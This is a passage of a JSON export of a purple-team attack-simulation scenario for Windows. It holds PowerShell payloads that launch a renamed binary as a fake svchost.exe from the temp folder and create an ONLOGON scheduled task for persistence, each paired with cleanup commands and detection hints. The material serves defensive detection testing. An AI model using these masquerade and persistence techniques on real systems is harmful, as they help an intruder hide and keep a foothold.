@@ -1,0 +1,2123 @@
+{
+ "export_version": 1,
+ "scenario_information": {
+  "scenario_id": "bfd56514-5315-5e9e-b1c5-0e08fa3201d1",
+  "scenario_name": "[wetland] purple-team C2 lab (Windows)",
+  "scenario_description": "Windows purple-team breach-and-attack-simulation of the wetland lab TTPs (github.com/s4nntysec/wetland). Each inject reproduces one technique as a self-cleaning PowerShell payload, tagged WETLAND-LAB and mapped to ATT&CK: masquerade as svchost (T1036), scheduled-task + Run-key persistence (T1053.005 / T1547.001), hidden file + timestomp (T1564.001 / T1070.006), an HTTP-shaped C2 beacon (T1071.001 / T1571), and a BENIGN ingress tool-transfer test that downloads the EICAR AV test file via curl.exe (T1105). The techniques are intentionally loud and reversible — the goal is detectable telemetry, not a real implant. Target your Windows assets, run, then review prevention/detection. Edit the beacon's $C2 line.",
+  "scenario_subtitle": "",
+  "scenario_category": "attack-scenario",
+  "scenario_main_focus": "endpoint-protection",
+  "scenario_severity": "high",
+  "scenario_message_header": "SIMULATION HEADER",
+  "scenario_message_footer": "SIMULATION FOOTER",
+  "scenario_mail_from": "noreply@threatops.local",
+  "scenario_tags": [],
+  "scenario_documents": [],
+  "scenario_dependencies": null
+ },
+ "scenario_teams": [],
+ "scenario_objectives": null,
+ "scenario_users": [],
+ "scenario_organizations": [],
+ "scenario_injects": [
+  {
+   "inject_id": "b99384a0-fea9-5bab-b50e-cbe8dce9fe73",
+   "inject_title": "Masquerade — fake svchost.exe from a user path (T1036)",
+   "inject_description": "Purple-team sim of `wld -M` / `wld lab masquerade` on Windows: copies a benign system binary to a user-writable path named svchost.exe and runs it briefly. Detection: an image named svchost.exe running outside System32 with a parent that is not services.exe.",
+   "inject_country": "",
+   "inject_city": "",
+   "inject_enabled": true,
+   "inject_content": {
+    "obfuscator": "plain-text",
+    "expectations": [
+     {
+      "expectation_type": "DETECTION",
+      "expectation_name": "Detection",
+      "expectation_description": null,
+      "expectation_score": 100,
+      "expectation_expectation_group": false,
+      "expectation_expiration_time": 21600
+     }
+    ],
+    "threatops_command_override": "",
+    "threatops_executor_override": "",
+    "threatops_cleanup_executor_override": "",
+    "threatops_cleanup_command_override": ""
+   },
+   "inject_all_teams": false,
+   "inject_depends_on": [],
+   "inject_depends_duration": 0,
+   "inject_injector_contract": {
+    "convertedContent": {
+     "config": {
+      "type": "openaev_implant",
+      "label": {
+       "fr": "OpenAEV Implant",
+       "en": "OpenAEV Implant"
+      },
+      "color_dark": "#000000",
+      "color_light": "#000000"
+     },
+     "label": {
+      "en": "Masquerade (fake svchost)",
+      "fr": "Masquerade (fake svchost)"
+     },
+     "manual": false,
+     "fields": [
+      {
+       "key": "assets",
+       "label": "Source assets",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": [
+        "assets",
+        "asset_groups"
+       ],
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "n",
+       "defaultValue": [],
+       "type": "asset"
+      },
+      {
+       "key": "asset_groups",
+       "label": "Source asset groups",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": [
+        "assets",
+        "asset_groups"
+       ],
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "n",
+       "defaultValue": [],
+       "type": "asset-group"
+      },
+      {
+       "key": "obfuscator",
+       "label": "Obfuscators",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": null,
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "1",
+       "defaultValue": [
+        "plain-text"
+       ],
+       "choices": [
+        {
+         "label": "plain-text",
+         "value": "plain-text"
+        },
+        {
+         "label": "base64",
+         "value": "base64"
+        }
+       ],
+       "type": "choice"
+      },
+      {
+       "key": "expectations",
+       "label": "Expectations",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": null,
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "n",
+       "defaultValue": [],
+       "predefinedExpectations": [
+        {
+         "expectation_type": "DETECTION",
+         "expectation_name": "Detection",
+         "expectation_description": null,
+         "expectation_score": 100.0,
+         "expectation_expectation_group": false,
+         "expectation_expiration_time": 21600
+        }
+       ],
+       "type": "expectation"
+      }
+     ],
+     "variables": [
+      {
+       "key": "user",
+       "label": "User that will receive the injection",
+       "type": "String",
+       "cardinality": "1",
+       "children": [
+        {
+         "key": "user.id",
+         "label": "Id of the user in the platform",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.email",
+         "label": "Email of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.firstname",
+         "label": "First name of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.lastname",
+         "label": "Last name of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.lang",
+         "label": "Language of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        }
+       ]
+      },
+      {
+       "key": "exercise",
+       "label": "Exercise of the current injection",
+       "type": "Object",
+       "cardinality": "1",
+       "children": [
+        {
+         "key": "exercise.id",
+         "label": "Id of the exercise in the platform",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "exercise.name",
+         "label": "Name of the exercise",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "exercise.description",
+         "label": "Description of the exercise",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        }
+       ]
+      },
+      {
+       "key": "teams",
+       "label": "List of team names for the injection",
+       "type": "String",
+       "cardinality": "n",
+       "children": []
+      },
+      {
+       "key": "player_uri",
+       "label": "Player interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      },
+      {
+       "key": "challenges_uri",
+       "label": "Challenges interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      },
+      {
+       "key": "scoreboard_uri",
+       "label": "Scoreboard interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      },
+      {
+       "key": "lessons_uri",
+       "label": "Lessons learned interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      }
+     ],
+     "context": {},
+     "atomicTesting": true,
+     "contract_id": "44f4b553-4c25-58a6-904a-27838cb1f515",
+     "contract_attack_patterns_external_ids": [],
+     "is_atomic_testing": true,
+     "needs_executor": true,
+     "platforms": [
+      "Windows"
+     ],
+     "domains": [
+      {
+       "listened": true,
+       "domain_id": "683fb18c-5200-4aec-b618-6ded488d3cde",
+       "domain_name": "Endpoint",
+       "domain_color": "#389CFF",
+       "domain_created_at": "2026-06-02T18:22:45.296458Z",
+       "domain_updated_at": "2026-06-02T18:22:45.296458Z"
+      }
+     ]
+    },
+    "listened": true,
+    "injector_contract_external_id": "57ed8eec-133a-594c-ab41-adc7390f52cb",
+    "injector_contract_labels": {
+     "en": "Masquerade (fake svchost)",
+     "fr": "Masquerade (fake svchost)"
+    },
+    "injector_contract_manual": false,
+    "injector_contract_content": "{\"config\":{\"type\":\"openaev_implant\",\"label\":{\"fr\":\"OpenAEV Implant\",\"en\":\"OpenAEV Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Masquerade (fake svchost)\",\"fr\":\"Masquerade (fake svchost)\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Source assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"asset_groups\"],\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"asset_groups\",\"label\":\"Source asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"asset_groups\"],\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\"},{\"label\":\"base64\",\"value\":\"base64\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the exercise in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team names for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"atomicTesting\":true,\"contract_id\":\"44f4b553-4c25-58a6-904a-27838cb1f515\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"],\"domains\":[{\"listened\":true,\"domain_id\":\"683fb18c-5200-4aec-b618-6ded488d3cde\",\"domain_name\":\"Endpoint\",\"domain_color\":\"#389CFF\",\"domain_created_at\":\"2026-06-02T18:22:45.296458Z\",\"domain_updated_at\":\"2026-06-02T18:22:45.296458Z\"}]}",
+    "injector_contract_custom": false,
+    "injector_contract_needs_executor": true,
+    "injector_contract_platforms": [
+     "Windows"
+    ],
+    "injector_contract_tags": [],
+    "injector_contract_payload": {
+     "listened": true,
+     "payload_id": "b3a51177-1641-542f-b5f4-1fa7cfb3027e",
+     "payload_type": "Command",
+     "payload_name": "wetland — Masquerade (fake svchost)",
+     "payload_description": "Purple-team sim of `wld -M` / `wld lab masquerade` on Windows: copies a benign system binary to a user-writable path named svchost.exe and runs it briefly. Detection: an image named svchost.exe running outside System32 with a parent that is not services.exe.",
+     "payload_platforms": [
+      "Windows"
+     ],
+     "payload_cleanup_executor": "psh",
+     "payload_cleanup_command": "$dst = Join-Path $env:TEMP 'svchost.exe'\nGet-Process svchost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $dst } | Stop-Process -Force -ErrorAction SilentlyContinue\nRemove-Item $dst -Force -ErrorAction SilentlyContinue\nWrite-Output 'WETLAND-LAB masquerade: cleaned'\n",
+     "payload_elevation_required": false,
+     "payload_arguments": [],
+     "payload_prerequisites": [],
+     "payload_external_id": "400314ac-05d0-59d5-be63-271f7516795f",
+     "payload_source": "MANUAL",
+     "payload_expectations": [
+      "DETECTION"
+     ],
+     "payload_status": "VERIFIED",
+     "payload_execution_arch": "ALL_ARCHITECTURES",
+     "payload_collector_type": null,
+     "payload_detection_remediations": [],
+     "payload_output_parsers": [],
+     "payload_created_at": "2026-10-30T20:02:35.584276Z",
+     "payload_updated_at": "2026-10-30T20:02:35.584290Z",
+     "command_executor": "psh",
+     "command_content": "$ErrorActionPreference='SilentlyContinue'\n$dst = Join-Path $env:TEMP 'svchost.exe'\nCopy-Item (Join-Path $env:SystemRoot 'System32\\timeout.exe') $dst -Force\nStart-Process $dst -ArgumentList '30' -WindowStyle Hidden\nWrite-Output \"WETLAND-LAB masquerade: started $dst as a fake svchost.exe (T1036.005)\"\nWrite-Output 'detect: svchost.exe image path not under System32; parent != services.exe'\n"
+    },
+    "injector_contract_created_at": "2026-10-30T20:02:35.585585Z",
+    "injector_contract_updated_at": "2026-10-30T20:02:35.585588Z",
+    "injector_contract_attack_patterns": [
+     {
+      "attack_pattern_id": "36d4fa87-b5a5-56f4-aa09-9e19062580e4",
+      "attack_pattern_name": "Match Legitimate Name or Location",
+      "attack_pattern_description": "MITRE ATT&CK technique exercised by the wetland purple-team lab.",
+      "attack_pattern_external_id": "T1036.005",
+      "attack_pattern_kill_chain_phases": []
+     },
+     {
+      "attack_pattern_id": "d010c8cf-2aac-597f-b852-055234065b3f",
+      "attack_pattern_name": "Masquerade Task or Service",
+      "attack_pattern_description": "MITRE ATT&CK technique exercised by the wetland purple-team lab.",
+      "attack_pattern_external_id": "T1036.004",
+      "attack_pattern_kill_chain_phases": []
+     }
+    ],
+    "injector_contract_domains": [
+     "683fb18c-5200-4aec-b618-6ded488d3cde"
+    ],
+    "injector_contract_vulnerabilities": [],
+    "injector_contract_atomic_testing": true,
+    "injector_contract_import_available": false,
+    "injector_contract_id": "44f4b553-4c25-58a6-904a-27838cb1f515",
+    "injector_contract_injector_type": "openaev_implant",
+    "injector_contract_arch": "ALL_ARCHITECTURES",
+    "injector_contract_payload_status": "VERIFIED",
+    "injector_contract_injectors": [
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144"
+    ],
+    "injector_contract_injector_names": {
+     "49229430-b5b5-431f-ba5b-f36f599b0144": "OpenAEV Implant"
+    }
+   },
+   "inject_tags": [],
+   "inject_teams": [],
+   "inject_documents": []
+  },
+  {
+   "inject_id": "6500e962-f2ec-5d0a-8340-c93e993a009d",
+   "inject_title": "Persistence — scheduled task (T1053.005)",
+   "inject_description": "Mirrors `wld lab persist` on Windows: creates an ONLOGON scheduled task named WETLAND-LAB (harmless heartbeat), removed on cleanup. Detection: `schtasks /Query /TN WETLAND-LAB`; Task Scheduler Operational event 4698.",
+   "inject_country": "",
+   "inject_city": "",
+   "inject_enabled": true,
+   "inject_content": {
+    "obfuscator": "plain-text",
+    "expectations": [
+     {
+      "expectation_type": "DETECTION",
+      "expectation_name": "Detection",
+      "expectation_description": null,
+      "expectation_score": 100,
+      "expectation_expectation_group": false,
+      "expectation_expiration_time": 21600
+     }
+    ],
+    "threatops_command_override": "",
+    "threatops_executor_override": "",
+    "threatops_cleanup_executor_override": "",
+    "threatops_cleanup_command_override": ""
+   },
+   "inject_all_teams": false,
+   "inject_depends_on": [],
+   "inject_depends_duration": 60,
+   "inject_injector_contract": {
+    "convertedContent": {
+     "config": {
+      "type": "openaev_implant",
+      "label": {
+       "fr": "OpenAEV Implant",
+       "en": "OpenAEV Implant"
+      },
+      "color_dark": "#000000",
+      "color_light": "#000000"
+     },
+     "label": {
+      "en": "Persistence (scheduled task)",
+      "fr": "Persistence (scheduled task)"
+     },
+     "manual": false,
+     "fields": [
+      {
+       "key": "assets",
+       "label": "Source assets",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": [
+        "assets",
+        "asset_groups"
+       ],
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "n",
+       "defaultValue": [],
+       "type": "asset"
+      },
+      {
+       "key": "asset_groups",
+       "label": "Source asset groups",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": [
+        "assets",
+        "asset_groups"
+       ],
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "n",
+       "defaultValue": [],
+       "type": "asset-group"
+      },
+      {
+       "key": "obfuscator",
+       "label": "Obfuscators",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": null,
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "1",
+       "defaultValue": [
+        "plain-text"
+       ],
+       "choices": [
+        {
+         "label": "plain-text",
+         "value": "plain-text"
+        },
+        {
+         "label": "base64",
+         "value": "base64"
+        }
+       ],
+       "type": "choice"
+      },
+      {
+       "key": "expectations",
+       "label": "Expectations",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": null,
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "n",
+       "defaultValue": [],
+       "predefinedExpectations": [
+        {
+         "expectation_type": "DETECTION",
+         "expectation_name": "Detection",
+         "expectation_description": null,
+         "expectation_score": 100.0,
+         "expectation_expectation_group": false,
+         "expectation_expiration_time": 21600
+        }
+       ],
+       "type": "expectation"
+      }
+     ],
+     "variables": [
+      {
+       "key": "user",
+       "label": "User that will receive the injection",
+       "type": "String",
+       "cardinality": "1",
+       "children": [
+        {
+         "key": "user.id",
+         "label": "Id of the user in the platform",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.email",
+         "label": "Email of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.firstname",
+         "label": "First name of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.lastname",
+         "label": "Last name of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.lang",
+         "label": "Language of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        }
+       ]
+      },
+      {
+       "key": "exercise",
+       "label": "Exercise of the current injection",
+       "type": "Object",
+       "cardinality": "1",
+       "children": [
+        {
+         "key": "exercise.id",
+         "label": "Id of the exercise in the platform",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "exercise.name",
+         "label": "Name of the exercise",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "exercise.description",
+         "label": "Description of the exercise",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        }
+       ]
+      },
+      {
+       "key": "teams",
+       "label": "List of team names for the injection",
+       "type": "String",
+       "cardinality": "n",
+       "children": []
+      },
+      {
+       "key": "player_uri",
+       "label": "Player interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      },
+      {
+       "key": "challenges_uri",
+       "label": "Challenges interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      },
+      {
+       "key": "scoreboard_uri",
+       "label": "Scoreboard interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      },
+      {
+       "key": "lessons_uri",
+       "label": "Lessons learned interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      }
+     ],
+     "context": {},
+     "atomicTesting": true,
+     "contract_id": "07638492-da08-5b8d-9d0f-daf193770eef",
+     "contract_attack_patterns_external_ids": [],
+     "is_atomic_testing": true,
+     "needs_executor": true,
+     "platforms": [
+      "Windows"
+     ],
+     "domains": [
+      {
+       "listened": true,
+       "domain_id": "683fb18c-5200-4aec-b618-6ded488d3cde",
+       "domain_name": "Endpoint",
+       "domain_color": "#389CFF",
+       "domain_created_at": "2026-06-02T18:22:45.296458Z",
+       "domain_updated_at": "2026-06-02T18:22:45.296458Z"
+      }
+     ]
+    },
+    "listened": true,
+    "injector_contract_external_id": "8a1cbda4-9711-5917-ad56-cc35b4bf1c7e",
+    "injector_contract_labels": {
+     "en": "Persistence (scheduled task)",
+     "fr": "Persistence (scheduled task)"
+    },
+    "injector_contract_manual": false,
+    "injector_contract_content": "{\"config\":{\"type\":\"openaev_implant\",\"label\":{\"fr\":\"OpenAEV Implant\",\"en\":\"OpenAEV Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Persistence (scheduled task)\",\"fr\":\"Persistence (scheduled task)\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Source assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"asset_groups\"],\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"asset_groups\",\"label\":\"Source asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"asset_groups\"],\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\"},{\"label\":\"base64\",\"value\":\"base64\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the exercise in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team names for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"atomicTesting\":true,\"contract_id\":\"07638492-da08-5b8d-9d0f-daf193770eef\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"],\"domains\":[{\"listened\":true,\"domain_id\":\"683fb18c-5200-4aec-b618-6ded488d3cde\",\"domain_name\":\"Endpoint\",\"domain_color\":\"#389CFF\",\"domain_created_at\":\"2026-06-02T18:22:45.296458Z\",\"domain_updated_at\":\"2026-06-02T18:22:45.296458Z\"}]}",
+    "injector_contract_custom": false,
+    "injector_contract_needs_executor": true,
+    "injector_contract_platforms": [
+     "Windows"
+    ],
+    "injector_contract_tags": [],
+    "injector_contract_payload": {
+     "listened": true,
+     "payload_id": "96fceda8-a72c-50d5-a361-581f988f8be4",
+     "payload_type": "Command",
+     "payload_name": "wetland — Persistence (scheduled task)",
+     "payload_description": "Mirrors `wld lab persist` on Windows: creates an ONLOGON scheduled task named WETLAND-LAB (harmless heartbeat), removed on cleanup. Detection: `schtasks /Query /TN WETLAND-LAB`; Task Scheduler Operational event 4698.",
+     "payload_platforms": [
+      "Windows"
+     ],
+     "payload_cleanup_executor": "psh",
+     "payload_cleanup_command": "schtasks /Delete /TN WETLAND-LAB /F | Out-Null\nWrite-Output 'WETLAND-LAB persist[schtask]: cleaned'\n",
+     "payload_elevation_required": false,
+     "payload_arguments": [],
+     "payload_prerequisites": [],
+     "payload_external_id": "4812d758-5ca7-5d2a-be58-5b0337c8adec",
+     "payload_source": "MANUAL",
+     "payload_expectations": [
+      "DETECTION"
+     ],
+     "payload_status": "VERIFIED",
+     "payload_execution_arch": "ALL_ARCHITECTURES",
+     "payload_collector_type": null,
+     "payload_detection_remediations": [],
+     "payload_output_parsers": [],
+     "payload_created_at": "2026-10-30T20:02:35.584276Z",
+     "payload_updated_at": "2026-10-30T20:02:35.584290Z",
+     "command_executor": "psh",
+     "command_content": "$log = Join-Path $env:TEMP 'wetland-lab.log'\nschtasks /Create /TN WETLAND-LAB /TR \"cmd /c echo WETLAND-LAB heartbeat >> `\"$log`\"\" /SC ONLOGON /F | Out-Null\nWrite-Output 'WETLAND-LAB persist[schtask]: created ONLOGON task WETLAND-LAB (T1053.005)'\nWrite-Output 'detect: schtasks /Query /TN WETLAND-LAB ; TaskScheduler/Operational 4698'\n"
+    },
+    "injector_contract_created_at": "2026-10-30T20:02:35.585585Z",
+    "injector_contract_updated_at": "2026-10-30T20:02:35.585588Z",
+    "injector_contract_attack_patterns": [
+     {
+      "attack_pattern_id": "64b55adb-6b9d-53c5-b486-ce429a8a3e00",
+      "attack_pattern_name": "Scheduled Task",
+      "attack_pattern_description": "MITRE ATT&CK technique exercised by the wetland purple-team lab.",
+      "attack_pattern_external_id": "T1053.005",
+      "attack_pattern_kill_chain_phases": []
+     }
+    ],
+    "injector_contract_domains": [
+     "683fb18c-5200-4aec-b618-6ded488d3cde"
+    ],
+    "injector_contract_vulnerabilities": [],
+    "injector_contract_atomic_testing": true,
+    "injector_contract_import_available": false,
+    "injector_contract_id": "07638492-da08-5b8d-9d0f-daf193770eef",
+    "injector_contract_injector_type": "openaev_implant",
+    "injector_contract_arch": "ALL_ARCHITECTURES",
+    "injector_contract_payload_status": "VERIFIED",
+    "injector_contract_injectors": [
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144"
+    ],
+    "injector_contract_injector_names": {
+     "49229430-b5b5-431f-ba5b-f36f599b0144": "OpenAEV Implant"
+    }
+   },
+   "inject_tags": [],
+   "inject_teams": [],
+   "inject_documents": []
+  },
+  {
